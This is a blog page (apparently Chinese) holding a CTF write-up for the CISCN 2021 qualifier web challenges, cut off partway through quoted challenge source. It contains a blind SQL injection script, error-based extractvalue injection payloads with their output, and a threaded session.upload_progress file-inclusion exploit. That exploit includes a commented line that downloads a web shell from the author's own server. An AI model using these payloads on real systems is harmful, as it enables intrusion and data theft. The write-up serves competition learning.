<!DOCTYPE html>
<html lang="zh-cn">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='CISCN 2021 çº¿ä¸Šåˆèµ›'><title>CISCN 2021 Quals Writeup web</title>

<link rel='canonical' href='https://anthem-whisper.github.io/p/ciscn-2021-quals-writeup-web/'>

<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='CISCN 2021 Quals Writeup web'>
<meta property='og:description' content='CISCN 2021 çº¿ä¸Šåˆèµ›'>
<meta property='og:url' content='https://anthem-whisper.github.io/p/ciscn-2021-quals-writeup-web/'>
<meta property='og:site_name' content='wh1sper'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='æ–‡ä»¶åŒ…å«' /><meta property='article:tag' content='æ— åˆ—åæ³¨å…¥' /><meta property='article:tag' content='ReflectionMethod' /><meta property='article:tag' content='imagecreatefrom' /><meta property='article:tag' content='session.upload_progress' /><meta property='article:published_time' content='2021-05-16T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-05-16T00:00:00&#43;00:00'/><meta property='og:image' content='https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210516174112.jpg' />
<meta name="twitter:title" content="CISCN 2021 Quals Writeup web">
<meta name="twitter:description" content="CISCN 2021 çº¿ä¸Šåˆèµ›"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210516174112.jpg' />
    <link rel="shortcut icon" href="img/favicon.ico" />

    </head>
    <body class="">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.body.dataset.scheme = 'dark';
        } else {
            document.body.dataset.scheme = 'light';
        }
    })();
</script><div class="container main-container flex on-phone--column extended article-page with-toolbar">
            <aside class="sidebar left-sidebar sticky">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="åˆ‡æ¢èœå•">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header class="site-info">
        
            <figure class="site-avatar">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu493b2ad2ace11203a689e4edf1306ab0_73291_300x0_resize_box_2.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                

                
                    <span class="emoji">ğŸ¥</span>
                
            </figure>
        
        <h1 class="site-name"><a href="https://anthem-whisper.github.io/">wh1sper</a></h1>
        <h2 class="site-description">ä¸“æ³¨Webå®‰å…¨ä¸ä»£ç å®¡è®¡</h2>
    </header>

    <ol class="menu" id="main-menu">
        
        
        

        <li >
            <a href='/'>
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>Home</span>
            </a>
        </li>
        
        

        <li >
            <a href='/about'>
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>About</span>
            </a>
        </li>
        
        

        <li >
            <a href='/archives'>
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        

        <li >
            <a href='/links'>
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>Links</span>
            </a>
        </li>
        
        

        <li >
            <a href='/search'>
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        

        
            <li id="dark-mode-toggle">
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                <span>æš—è‰²æ¨¡å¼</span>
            </li>
        
    </ol>
</aside>

            <main class="main full-width">
    <div id="article-toolbar">
        <a href="https://anthem-whisper.github.io/" class="back-home">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="15 6 9 12 15 18" />
</svg>



            <span>Back</span>
        </a>
    </div>

    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/ciscn-2021-quals-writeup-web/">
                
                    <img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210516174112.jpg" loading="lazy" alt="Featured image of post CISCN 2021 Quals Writeup web" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" >
                æ–‡ä»¶åŒ…å«
            </a>
        
            <a href="/tags/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/" >
                æ— åˆ—åæ³¨å…¥
            </a>
        
            <a href="/tags/reflectionmethod/" >
                ReflectionMethod
            </a>
        
            <a href="/tags/imagecreatefrom/" >
                imagecreatefrom
            </a>
        
            <a href="/tags/session.upload_progress/" >
                session.upload_progress
            </a>
        
    </header>
    

    <h2 class="article-title">
        <a href="/p/ciscn-2021-quals-writeup-web/">CISCN 2021 Quals Writeup web</a>
    </h2>

    
    <h3 class="article-subtitle">
        CISCN 2021 çº¿ä¸Šåˆèµ›
    </h3>
    <footer class="article-time">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



        <time class="article-time--published">May 16, 2021</time>
    </footer></div>
</header>

    <section class="article-content">
    <p>å°±å‘ä¸‹webçš„ï¼Œæ‰€æœ‰wpæˆ³è¿™é‡Œ-&gt;<a class="link" href="https://ctf.njupt.edu.cn/613.html"  target="_blank" rel="noopener"
    >ç¬¬åå››å±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›åˆèµ› Writeup by X1cT34m</a></p>
<h2 id="web">Web</h2>
<h3 id="easy_source">easy_source</h3>
<p>åŸé¢˜ï¼Œ<code>ReflectionMethod</code> æ„é€  <code>User</code> ç±»ä¸­çš„å‡½æ•°æ–¹æ³•ï¼Œå†é€šè¿‡ <code>getDocComment</code> è·å–å‡½æ•°çš„æ³¨é‡Š</p>
<p><a href="https://r0yanx.com/2020/10/28/fslh-writeup/">https://r0yanx.com/2020/10/28/fslh-writeup/</a></p>
<p>æäº¤å‚æ•°ï¼š</p>
<pre><code>?rc=ReflectionMethod&amp;ra=User&amp;rb=a&amp;rd=getDocComment
</code></pre><p>çˆ†ç ´rbçš„å€¼a-zï¼Œåœ¨qå¾—åˆ°flagï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210522220457.png" alt=""  /></p>
<p>CISCN{fvsgF-5rRwf-p8KZP-vOndu-SIQoM-}</p>
<h3 id="easy_sql">easy_sql</h3>
<p>fuzzï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210522220503.png" alt="image-bansdasdsads"  /></p>
<p>sqlmapå¾—åˆ°è¡¨åflagå’Œä¸€ä¸ªåˆ—åidï¼šæŠ¥é”™åŠ æ— åˆ—åæ³¨å…¥</p>
<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210522220520.png" alt=""  /></p>
<p>ä¸€å¼€å§‹ç”¨æŒ‰ä½æ¯”è¾ƒï¼š</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://124.70.35.238:23511/&#39;</span>
<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">flag</span><span class="p">):</span>
    <span class="n">res</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
    <span class="n">res</span> <span class="o">+=</span> <span class="n">flag</span>
    <span class="k">return</span> <span class="n">res</span>
<span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">200</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">127</span><span class="p">):</span>
        <span class="n">hexchar</span> <span class="o">=</span> <span class="n">add</span><span class="p">(</span><span class="n">flag</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">char</span><span class="p">))</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;1&#39;) or (select 1,&#39;NO&#39;,&#39;CISCN{JGHHS-JPD52-IJK4O-MGPDZ-DUFWI-&#39;)&gt;=(select * from security.flag limit 1)#&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">hexchar</span><span class="p">)</span>
        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;uname&#34;</span><span class="p">:</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span><span class="s1">&#39;passwd&#39;</span><span class="p">:</span><span class="n">payload</span><span class="p">}</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
        <span class="n">text</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>
        <span class="k">if</span> <span class="s1">&#39;login&lt;&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
            <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">char</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
            <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
            <span class="k">break</span>
</code></pre></div><p>åˆ°æœ€åå¡ä½äº†ï¼Œæ¢äº†æ— åˆ—åæ³¨å…¥æŠ¥é”™çˆ†åˆ—åï¼Œç„¶åç›´æ¥æŠ¥é”™æ³¨å…¥ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210517175941.png" alt="image-20210517175932809"  /></p>
<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210522220543.png" alt=""  /></p>
<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">admin</span><span class="s1">&#39;)||extractvalue(1,concat(0x7e,(select * from (select * from flag as a join (select * from flag)b using(id,no))c)))#
</span><span class="s1">//Duplicate column name &#39;</span><span class="n">e0f1d955</span><span class="o">-</span><span class="n">bbba</span><span class="o">-</span><span class="mi">43</span><span class="n">c3</span><span class="o">-</span><span class="n">b078</span><span class="o">-</span><span class="n">a81b3fc4bf28</span><span class="s1">&#39;
</span><span class="s1">
</span><span class="s1">admin&#39;</span><span class="p">)</span><span class="o">||</span><span class="p">(</span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span> <span class="o">`</span><span class="n">e0f1d955</span><span class="o">-</span><span class="n">bbba</span><span class="o">-</span><span class="mi">43</span><span class="n">c3</span><span class="o">-</span><span class="n">b078</span><span class="o">-</span><span class="n">a81b3fc4bf28</span><span class="o">`</span> <span class="k">from</span> <span class="k">security</span><span class="p">.</span><span class="n">flag</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">)))</span><span class="o">#</span>
<span class="o">//</span><span class="n">XPATH</span> <span class="n">syntax</span> <span class="n">error</span><span class="p">:</span> <span class="s1">&#39;~CISCN{JgHhs-jpd52-iJk4O-MGPDz-d&#39;</span>

<span class="k">admin</span><span class="s1">&#39;)||(extractvalue(1,concat(0x7e,substr((select `e0f1d955-bbba-43c3-b078-a81b3fc4bf28` from security.flag),32,50),0x7e)))#
</span><span class="s1">//XPATH syntax error: &#39;</span><span class="o">~</span><span class="n">uFWI</span><span class="o">-</span><span class="err">}</span><span class="o">~</span><span class="s1">&#39;
</span></code></pre></div><p>CISCN{JgHhs-jpd52-iJk4O-MGPDz-duFWI-}</p>
<h3 id="middle_source">middle_source</h3>
<p>é¦–é¡µç»™äº†ä»»æ„æ–‡ä»¶åŒ…å«</p>
<p>æ‰«ç›®å½•å¾—åˆ°<code>.listing</code>ï¼Œå¾—åˆ°<code>you_can_seeeeeeee_me.php</code>æ˜¯phpinfoé¡µé¢</p>
<p>æœ‰äº†phpinfoå¯ä»¥å°è¯•ç›´æ¥å‘phpinfoé¡µé¢ä¼ æ–‡ä»¶åŠ åƒåœ¾æ•°æ®ï¼ŒåŒæ—¶ä»phpinfoè·å–ä¸´æ—¶æ–‡ä»¶åè¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œæˆ–è€…åˆ©ç”¨<code>session.upload_progress</code>è¿›è¡Œsessionæ–‡ä»¶åŒ…å«</p>
<p>å‰è€…å°è¯•æ— æ•ˆæœ</p>
<p>ä»phpinfoå¾—åˆ°äº†sessionä¿å­˜è·¯å¾„ï¼š<code>/var/lib/php/sessions/fccecfeaje/</code></p>
<p>å°è¯•å‘ç°å¯ä»¥å‡ºç½‘ï¼Œè™½ç„¶banäº†å¾ˆå¤šå‡½æ•°ï¼Œä½†æ˜¯å¯ä»¥ç›´æ¥ç”¨copyæˆ–file_get_contentsä¸‹è½½shell</p>
<p>åœ¨<code>/etc/acfffacfch/iabhcgedde/facafcfjgf/adeejdbegg/fdceiadhce/fl444444g</code>å‘ç°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210522220552.png" alt=""  /></p>
<p>expï¼š</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">threading</span>

<span class="c1">#file_content = &#39;&lt;?php print_r(scandir(&#34;/etc&#34;));?&gt;&#39;</span>
<span class="c1">#file_content = &#39;&lt;?php copy(&#34;http://myvps/s.txt&#34;,&#34;/tmp/leon.php&#34;);echo &#34;666666666&#34;;?&gt;&#39;</span>
<span class="c1">#s.txtæ˜¯shellä¸€å¥è¯</span>
<span class="n">file_content</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php var_dump(file_get_contents(&#34;/etc/acfffacfch/iabhcgedde/facafcfjgf/adeejdbegg/fdceiadhce/fl444444g&#34;));?&gt;&#39;</span>

<span class="n">url</span><span class="o">=</span><span class="s1">&#39;http://124.70.35.238:23579/&#39;</span>
<span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">POST</span><span class="p">():</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="nb">file</span><span class="o">=</span><span class="p">{</span>
            <span class="s2">&#34;upload&#34;</span><span class="p">:(</span><span class="s1">&#39;&lt;?php echo 999;?&gt;&#39;</span><span class="p">,</span> <span class="n">file_content</span><span class="p">,</span> <span class="s1">&#39;image/jpeg&#39;</span><span class="p">)</span>
        <span class="p">}</span>
        <span class="n">data</span><span class="o">=</span><span class="p">{</span>
            <span class="s2">&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;</span><span class="p">:</span><span class="n">file_content</span>
        <span class="p">}</span>
        <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
            <span class="s2">&#34;Cookie&#34;</span><span class="p">:</span><span class="s1">&#39;PHPSESSID=1234&#39;</span>
        <span class="p">}</span>
        <span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">files</span><span class="o">=</span><span class="nb">file</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">READ</span><span class="p">():</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">event</span><span class="o">.</span><span class="n">wait</span><span class="p">()</span>
        <span class="n">t</span><span class="o">=</span><span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&#34;http://124.70.35.238:23579/&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;cf&#34;</span><span class="p">:</span><span class="s1">&#39;../../../../../../../../../../var/lib/php/sessions/fccecfeaje/sess_1234&#39;</span><span class="p">})</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">text</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2230</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s1">&#39;[+]retry&#39;</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
            <span class="n">event</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
<span class="n">event</span><span class="o">=</span><span class="n">threading</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span>
<span class="n">event</span><span class="o">.</span><span class="n">set</span><span class="p">()</span>
<span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">POST</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">())</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
<span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">POST</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">())</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
<span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">POST</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">())</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
<span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">READ</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">())</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
<span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">READ</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">())</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
<span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">READ</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">())</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210522220603.png" alt=""  /></p>
<p>CISCN{yo19m-ZqNC1-URusV-u83jg-zxqpZ-}</p>
<h3 id="upload">upload</h3>
<p>mb_strtolowerã€PHPäºŒæ¬¡æ¸²æŸ“</p>
<p>è¿™é“é¢˜æ”¶å·ä¸¤å°æ—¶ä¹‹å‰å°±çœ‹åˆ°phpinfoäº†ï¼Œä½†æ˜¯æ²¡åšå‡ºæ¥ï¼Œæœ‰ç‚¹å¯æƒœ</p>
<p>è®¿é—®é¢˜ç›®å°±æœ‰æºç </p>
<p>index.php</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
    <span class="k">die</span><span class="p">();</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">]))</span>
    <span class="nv">$ctf</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">];</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$ctf</span><span class="o">==</span><span class="s2">&#34;upload&#34;</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;postedFile&#39;</span><span class="p">][</span><span class="s1">&#39;size&#39;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">1024</span><span class="o">*</span><span class="mi">512</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;è¿™ä¹ˆå¤§ä¸ªçš„ä¸œè¥¿ä½ æ˜¯æƒ³dæˆ‘å—ï¼Ÿ&#34;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nv">$imageinfo</span> <span class="o">=</span> <span class="nx">getimagesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;postedFile&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$imageinfo</span> <span class="o">===</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;å¦‚æœä¸èƒ½å¥½å¥½ä¼ å›¾ç‰‡çš„è¯å°±è¿˜æ˜¯ä¸è¦æ¥æ‰“æ‰°æˆ‘äº†&#34;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$imageinfo</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nv">$imageinfo</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;ä¸œè¥¿ä¸èƒ½æ–¹æ–¹æ­£æ­£çš„è¯å°±å¾ˆè®¨åŒ&#34;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nv">$fileName</span><span class="o">=</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;postedFile&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">stristr</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="s2">&#34;c&#34;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="s2">&#34;i&#34;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="s2">&#34;h&#34;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="s2">&#34;ph&#34;</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;æœ‰äº›ä¸œè¥¿è®©ä½ ä¼ ä¸Šå»çš„è¯é‚£å¯ä¸å¾—äº†&#34;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nv">$imagePath</span> <span class="o">=</span> <span class="s2">&#34;image/&#34;</span> <span class="o">.</span> <span class="nx">mb_strtolower</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;postedFile&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">],</span> <span class="nv">$imagePath</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&#34;upload success, image at </span><span class="si">$imagePath</span><span class="s2">&#34;</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;ä¼ éƒ½æ²¡æœ‰ä¼ ä¸Šå»&#34;</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>æ‰«ç›®å½•èƒ½æ‰«åˆ°example.php</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
    <span class="k">die</span><span class="p">();</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">]))</span>
    <span class="nv">$ctf</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">];</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$ctf</span><span class="o">==</span><span class="s2">&#34;poc&#34;</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$zip</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">\ZipArchive</span><span class="p">();</span>
    <span class="nv">$name_for_zip</span> <span class="o">=</span> <span class="s2">&#34;example/&#34;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">];</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span><span class="nv">$name_for_zip</span><span class="p">)[</span><span class="nx">count</span><span class="p">(</span><span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span><span class="nv">$name_for_zip</span><span class="p">))</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">!==</span><span class="s2">&#34;zip&#34;</span><span class="p">)</span> <span class="p">{</span>
